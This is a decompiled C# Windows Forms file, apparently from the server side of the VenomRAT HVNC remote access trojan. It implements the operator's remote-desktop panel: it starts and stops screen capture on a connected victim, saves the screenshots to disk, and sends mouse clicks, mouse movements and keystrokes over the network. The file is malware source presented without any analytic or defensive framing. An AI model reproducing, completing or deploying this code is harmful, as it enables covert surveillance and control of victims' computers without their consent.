using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Windows.Forms;
using VenomRAT_HVNC.Server;
using Server.MessagePack;
using VenomRAT_HVNC.Server.Properties;
using VenomRAT_HVNC.Server.Connection;

using VenomRAT_HVNC.Server.Properties;

using VenomRAT_HVNC.StreamLibrary;
using VenomRAT_HVNC.StreamLibrary.UnsafeCodecs;

namespace VenomRAT_HVNC.Server.Forms
{
    // Token: 0x02000087 RID: 135
    public partial class FormRemoteDesktop : Form
    {
        // Token: 0x170000D4 RID: 212
        // (get) Token: 0x060004E6 RID: 1254 RVA: 0x00039D9E File Offset: 0x00039D9E
        // (set) Token: 0x060004E7 RID: 1255 RVA: 0x00039DA6 File Offset: 0x00039DA6
        public Form1 F { get; set; }

        // Token: 0x170000D5 RID: 213
        // (get) Token: 0x060004E8 RID: 1256 RVA: 0x00039DAF File Offset: 0x00039DAF
        // (set) Token: 0x060004E9 RID: 1257 RVA: 0x00039DB7 File Offset: 0x00039DB7
        internal Clients ParentClient { get; set; }

        // Token: 0x170000D6 RID: 214
        // (get) Token: 0x060004EA RID: 1258 RVA: 0x00039DC0 File Offset: 0x00039DC0
        // (set) Token: 0x060004EB RID: 1259 RVA: 0x00039DC8 File Offset: 0x00039DC8
        internal Clients Client { get; set; }

        // Token: 0x170000D7 RID: 215
        // (get) Token: 0x060004EC RID: 1260 RVA: 0x00039DD1 File Offset: 0x00039DD1
        // (set) Token: 0x060004ED RID: 1261 RVA: 0x00039DD9 File Offset: 0x00039DD9
        public string FullPath { get; set; }

        // Token: 0x170000D8 RID: 216
        // (get) Token: 0x060004EE RID: 1262 RVA: 0x00039DE2 File Offset: 0x00039DE2
        // (set) Token: 0x060004EF RID: 1263 RVA: 0x00039DEA File Offset: 0x00039DEA
        public Image GetImage { get; set; }

        // Token: 0x060004F0 RID: 1264 RVA: 0x00039DF3 File Offset: 0x00039DF3
        public FormRemoteDesktop()
        {
            this._keysPressed = new List<Keys>();
            this.InitializeComponent();
        }

        // Token: 0x060004F1 RID: 1265 RVA: 0x00039E30 File Offset: 0x00039E30
        private void timer1_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!this.ParentClient.TcpClient.Connected || !this.Client.TcpClient.Connected)
                {
                    base.Close();
                }
            }
            catch
            {
                base.Close();
            }
        }

        // Token: 0x060004F2 RID: 1266 RVA: 0x00039E84 File Offset: 0x00039E84
        private void FormRemoteDesktop_Load(object sender, EventArgs e)
        {
            try
            {
                this.button1.Tag = "stop";
            }
            catch
            {
            }
        }

        // Token: 0x060004F3 RID: 1267 RVA: 0x00039EB8 File Offset: 0x00039EB8
        private void Button1_Click(object sender, EventArgs e)
        {
            if (this.button1.Tag == "play")
            {
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                msgPack.ForcePathObject("Option").AsString = "capture";
                msgPack.ForcePathObject("Quality").AsInteger = (long)Convert.ToInt32(this.numericUpDown1.Value.ToString());
                msgPack.ForcePathObject("Screen").AsInteger = (long)Convert.ToInt32(this.numericUpDown2.Value.ToString());
                this.decoder = new UnsafeStreamCodec(Convert.ToInt32(this.numericUpDown1.Value), true);
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                this.numericUpDown1.Enabled = false;
                this.numericUpDown2.Enabled = false;
                this.btnSave.Enabled = true;
                this.btnMouse.Enabled = true;
                this.button1.Tag = "stop";
                this.button1.BackgroundImage = Resources.stop__1_;
                return;
            }
            this.button1.Tag = "play";
            try
            {
                MsgPack msgPack2 = new MsgPack();
                msgPack2.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                msgPack2.ForcePathObject("Option").AsString = "stop";
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack2.Encode2Bytes());
            }
            catch
            {
            }
            this.numericUpDown1.Enabled = true;
            this.numericUpDown2.Enabled = true;
            this.btnSave.Enabled = false;
            this.btnMouse.Enabled = false;
            this.button1.BackgroundImage = Resources.play_button;
        }

        // Token: 0x060004F4 RID: 1268 RVA: 0x0003A098 File Offset: 0x0003A098
        private void BtnSave_Click(object sender, EventArgs e)
        {
            if (this.button1.Tag == "stop")
            {
                if (this.timerSave.Enabled)
                {
                    this.timerSave.Stop();
                    this.btnSave.BackgroundImage = Resources.save_image;
                    return;
                }
                this.timerSave.Start();
                this.btnSave.BackgroundImage = Resources.save_image2;
                try
                {
                    if (!Directory.Exists(this.FullPath))
                    {
                        Directory.CreateDirectory(this.FullPath);
                    }
                    Process.Start(this.FullPath);
                }
                catch
                {
                }
            }
        }

        // Token: 0x060004F5 RID: 1269 RVA: 0x0003A138 File Offset: 0x0003A138
        private void TimerSave_Tick(object sender, EventArgs e)
        {
            try
            {
                if (!Directory.Exists(this.FullPath))
                {
                    Directory.CreateDirectory(this.FullPath);
                }
                Encoder quality = Encoder.Quality;
                EncoderParameters encoderParameters = new EncoderParameters(1);
                EncoderParameter encoderParameter = new EncoderParameter(quality, 50L);
                encoderParameters.Param[0] = encoderParameter;
                ImageCodecInfo encoder = this.GetEncoder(ImageFormat.Jpeg);
                this.pictureBox1.Image.Save(this.FullPath + "\\IMG_" + DateTime.Now.ToString("MM-dd-yyyy HH;mm;ss") + ".jpeg", encoder, encoderParameters);
                if (encoderParameters != null)
                {
                    encoderParameters.Dispose();
                }
                if (encoderParameter != null)
                {
                    encoderParameter.Dispose();
                }
            }
            catch
            {
            }
        }

        // Token: 0x060004F6 RID: 1270 RVA: 0x0003A1EC File Offset: 0x0003A1EC
        private ImageCodecInfo GetEncoder(ImageFormat format)
        {
            ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
            foreach (ImageCodecInfo imageCodecInfo in imageDecoders)
            {
                if (imageCodecInfo.FormatID == format.Guid)
                {
                    return imageCodecInfo;
                }
            }
            return null;
        }

        // Token: 0x060004F7 RID: 1271 RVA: 0x0003A22C File Offset: 0x0003A22C
        private void PictureBox1_MouseDown(object sender, MouseEventArgs e)
        {
            try
            {
                if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
                {
                    Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
                    int num = 0;
                    if (e.Button == MouseButtons.Left)
                    {
                        num = 2;
                    }
                    if (e.Button == MouseButtons.Right)
                    {
                        num = 8;
                    }
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                    msgPack.ForcePathObject("Option").AsString = "mouseClick";
                    msgPack.ForcePathObject("X").AsInteger = (long)point.X;
                    msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
                    msgPack.ForcePathObject("Button").AsInteger = (long)num;
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }

        // Token: 0x060004F8 RID: 1272 RVA: 0x0003A38C File Offset: 0x0003A38C
        private void PictureBox1_MouseUp(object sender, MouseEventArgs e)
        {
            try
            {
                if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
                {
                    Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
                    int num = 0;
                    if (e.Button == MouseButtons.Left)
                    {
                        num = 4;
                    }
                    if (e.Button == MouseButtons.Right)
                    {
                        num = 16;
                    }
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                    msgPack.ForcePathObject("Option").AsString = "mouseClick";
                    msgPack.ForcePathObject("X").AsInteger = (long)point.X;
                    msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
                    msgPack.ForcePathObject("Button").AsInteger = (long)num;
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }

        // Token: 0x060004F9 RID: 1273 RVA: 0x0003A4F0 File Offset: 0x0003A4F0
        private void pictureBox1_MouseMove(object sender, MouseEventArgs e)
        {
            try
            {
                if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isMouse)
                {
                    Point point = new Point(e.X * this.rdSize.Width / this.pictureBox1.Width, e.Y * this.rdSize.Height / this.pictureBox1.Height);
                    MsgPack msgPack = new MsgPack();
                    msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                    msgPack.ForcePathObject("Option").AsString = "mouseMove";
                    msgPack.ForcePathObject("X").AsInteger = (long)point.X;
                    msgPack.ForcePathObject("Y").AsInteger = (long)point.Y;
                    ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
                }
            }
            catch
            {
            }
        }

        // Token: 0x060004FA RID: 1274 RVA: 0x0003A620 File Offset: 0x0003A620
        private void Button3_Click(object sender, EventArgs e)
        {
            if (this.isMouse)
            {
                this.isMouse = false;
                this.btnMouse.BackgroundImage = Resources.mouse;
            }
            else
            {
                this.isMouse = true;
                this.btnMouse.BackgroundImage = Resources.mouse_enable;
            }
            this.pictureBox1.Focus();
        }

        // Token: 0x060004FB RID: 1275 RVA: 0x0003A674 File Offset: 0x0003A674
        private void FormRemoteDesktop_FormClosed(object sender, FormClosedEventArgs e)
        {
            try
            {
                Image getImage = this.GetImage;
                if (getImage != null)
                {
                    getImage.Dispose();
                }
                ThreadPool.QueueUserWorkItem(delegate (object o)
                {
                    Clients client = this.Client;
                    if (client == null)
                    {
                        return;
                    }
                    client.Disconnected();
                });
            }
            catch
            {
            }
        }

        // Token: 0x060004FC RID: 1276 RVA: 0x0003A6BC File Offset: 0x0003A6BC
        private void btnKeyboard_Click(object sender, EventArgs e)
        {
            if (this.isKeyboard)
            {
                this.isKeyboard = false;
                this.btnKeyboard.BackgroundImage = Resources.keyboard;
            }
            else
            {
                this.isKeyboard = true;
                this.btnKeyboard.BackgroundImage = Resources.keyboard_on;
            }
            this.pictureBox1.Focus();
        }

        // Token: 0x060004FD RID: 1277 RVA: 0x0003A710 File Offset: 0x0003A710
        private void FormRemoteDesktop_KeyDown(object sender, KeyEventArgs e)
        {
            if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && this.pictureBox1.ContainsFocus && this.isKeyboard)
            {
                if (!this.IsLockKey(e.KeyCode))
                {
                    e.Handled = true;
                }
                if (this._keysPressed.Contains(e.KeyCode))
                {
                    return;
                }
                this._keysPressed.Add(e.KeyCode);
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                msgPack.ForcePathObject("Option").AsString = "keyboardClick";
                msgPack.ForcePathObject("key").AsInteger = (long)Convert.ToInt32(e.KeyCode);
                msgPack.ForcePathObject("keyIsDown").SetAsBoolean(true);
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        // Token: 0x060004FE RID: 1278 RVA: 0x0003A818 File Offset: 0x0003A818
        private void FormRemoteDesktop_KeyUp(object sender, KeyEventArgs e)
        {
            if (this.button1.Tag == "stop" && this.pictureBox1.Image != null && base.ContainsFocus && this.isKeyboard)
            {
                if (!this.IsLockKey(e.KeyCode))
                {
                    e.Handled = true;
                }
                this._keysPressed.Remove(e.KeyCode);
                MsgPack msgPack = new MsgPack();
                msgPack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                msgPack.ForcePathObject("Option").AsString = "keyboardClick";
                msgPack.ForcePathObject("key").AsInteger = (long)Convert.ToInt32(e.KeyCode);
                msgPack.ForcePathObject("keyIsDown").SetAsBoolean(false);
                ThreadPool.QueueUserWorkItem(new WaitCallback(this.Client.Send), msgPack.Encode2Bytes());
            }
        }

        // Token: 0x060004FF RID: 1279 RVA: 0x0003A906 File Offset: 0x0003A906
        private bool IsLockKey(Keys key)
        {
            return (key & Keys.Capital) == Keys.Capital || (key & Keys.NumLock) == Keys.NumLock || (key & Keys.Scroll) == Keys.Scroll;
        }

        // Token: 0x0400047A RID: 1146
        public int FPS;

        // Token: 0x0400047B RID: 1147
        public Stopwatch sw = Stopwatch.StartNew();

        // Token: 0x0400047C RID: 1148
        public IUnsafeCodec decoder = new UnsafeStreamCodec(60, true);

        // Token: 0x0400047D RID: 1149
        public Size rdSize;

        // Token: 0x0400047E RID: 1150
        private bool isMouse;

        // Token: 0x0400047F RID: 1151
        private bool isKeyboard;

        // Token: 0x04000480 RID: 1152
        public object syncPicbox = new object();

        // Token: 0x04000481 RID: 1153
        private readonly List<Keys> _keysPressed;
    }
}